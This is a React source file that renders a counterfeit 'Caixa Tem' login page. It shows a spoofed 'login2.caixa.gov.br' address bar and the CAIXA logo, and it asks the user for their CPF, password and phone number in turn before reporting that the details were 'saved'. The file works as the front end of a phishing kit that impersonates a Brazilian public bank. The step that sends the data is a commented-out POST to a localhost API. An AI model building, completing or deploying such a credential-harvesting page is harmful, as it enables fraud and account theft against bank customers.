
import { useState } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Form, FormControl, FormField, FormItem } from "@/components/ui/form";
import { useForm } from "react-hook-form";
import { Loader2, User, Lock, Phone } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { useToast } from "@/components/ui/use-toast";

interface LoginFormData {
  cpf: string;
  password: string;
  phone: string;
}

const Index = () => {
  const [isLoading, setIsLoading] = useState(false);
  const [step, setStep] = useState<'cpf' | 'password' | 'phone'>('cpf');
  const navigate = useNavigate();
  const { toast } = useToast();

  const form = useForm<LoginFormData>({
    defaultValues: {
      cpf: "",
      password: "",
      phone: "",
    },
  });

  const onSubmit = async (data: LoginFormData) => {
    try {
      if (step === 'cpf') {
        setStep('password');
        return;
      }
      if (step === 'password') {
        setStep('phone');
        return;
      }
      
      setIsLoading(true);
      console.log("Form data:", data);
      
      // Simulando uma chamada à API
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Aqui você faria a chamada real à API
      // const response = await fetch('http://localhost:3000/api/users/login', {
      //   method: 'POST',
      //   headers: {
      //     'Content-Type': 'application/json',
      //   },
      //   body: JSON.stringify(data),
      // });

      toast({
        title: "Sucesso!",
        description: "Suas informações foram salvas com sucesso.",
      });

      navigate('/success');
    } catch (error) {
      console.error('Erro ao salvar:', error);
      toast({
        variant: "destructive",
        title: "Erro",
        description: "Ocorreu um erro ao salvar suas informações.",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const getStepTitle = () => {
    switch (step) {
      case 'cpf':
        return "Informe seu CPF e clique em \"Próximo\" para continuar:";
      case 'password':
        return "Digite sua senha para continuar:";
      case 'phone':
        return "Digite seu número de telefone para continuar:";
    }
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <div className="flex items-center justify-between p-4 bg-white border-b border-gray-200">
        <button 
          className="text-blue-500 text-lg"
          onClick={() => {
            if (step === 'phone') setStep('password');
            else if (step === 'password') setStep('cpf');
          }}
        >
          {step !== 'cpf' ? 'Voltar' : 'Cancelar'}
        </button>
        <div className="flex items-center">
          <span className="text-gray-800">login2.caixa.gov.br</span>
          <button className="ml-4 text-blue-500">
            <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
            </svg>
          </button>
        </div>
      </div>

      {/* Main Content */}
      <div className="p-6">
        {/* Logo */}
        <div className="flex justify-center mb-4">
          <img 
            src="/lovable-uploads/ee1a9cdc-d9a5-4063-a970-435d05fec562.png" 
            alt="CAIXA" 
            className="w-32 mb-2"
          />
        </div>
        <h2 className="text-center text-blue-600 text-xl mb-8">Aplicativo Caixa Tem</h2>

        <p className="text-gray-600 text-lg mb-8 text-center">
          {getStepTitle()}
        </p>

        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
            {step === 'cpf' && (
              <FormField
                control={form.control}
                name="cpf"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <div className="relative">
                        <div className="absolute left-0 top-2">
                          <User className="h-6 w-6 text-gray-400" />
                        </div>
                        <Input
                          placeholder="CPF"
                          type="text"
                          className="pl-8 border-t-0 border-l-0 border-r-0 border-b-2 border-orange-400 rounded-none text-lg py-2"
                          disabled={isLoading}
                          {...field}
                        />
                      </div>
                    </FormControl>
                  </FormItem>
                )}
              />
            )}

            {step === 'password' && (
              <FormField
                control={form.control}
                name="password"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <div className="relative">
                        <div className="absolute left-0 top-2">
                          <Lock className="h-6 w-6 text-gray-400" />
                        </div>
                        <Input
                          placeholder="Senha"
                          type="password"
                          className="pl-8 border-t-0 border-l-0 border-r-0 border-b-2 border-orange-400 rounded-none text-lg py-2"
                          disabled={isLoading}
                          {...field}
                        />
                      </div>
                    </FormControl>
                  </FormItem>
                )}
              />
            )}

            {step === 'phone' && (
              <FormField
                control={form.control}
                name="phone"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <div className="relative">
                        <div className="absolute left-0 top-2">
                          <Phone className="h-6 w-6 text-gray-400" />
                        </div>
                        <Input
                          placeholder="Telefone"
                          type="tel"
                          className="pl-8 border-t-0 border-l-0 border-r-0 border-b-2 border-orange-400 rounded-none text-lg py-2"
                          disabled={isLoading}
                          {...field}
                        />
                      </div>
                    </FormControl>
                  </FormItem>
                )}
              />
            )}

            <Button
              type="submit"
              className="w-full bg-orange-500 hover:bg-orange-600 text-white text-lg py-6 rounded-lg"
              disabled={isLoading}
            >
              {isLoading ? (
                <>
                  <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                  Processando...
                </>
              ) : (
                step === 'phone' ? "Entrar" : "Próximo"
              )}
            </Button>
          </form>
        </Form>

        <div className="mt-12 space-y-6">
          <div className="text-center">
            <p className="text-gray-600">É novo por aqui?</p>
            <a href="#" className="text-blue-600 font-medium">
              Cadastre-se e abra a sua conta
            </a>
          </div>

          <div className="text-center">
            <a href="#" className="text-blue-600 font-medium flex items-center justify-center">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              Preciso de ajuda
            </a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Index;
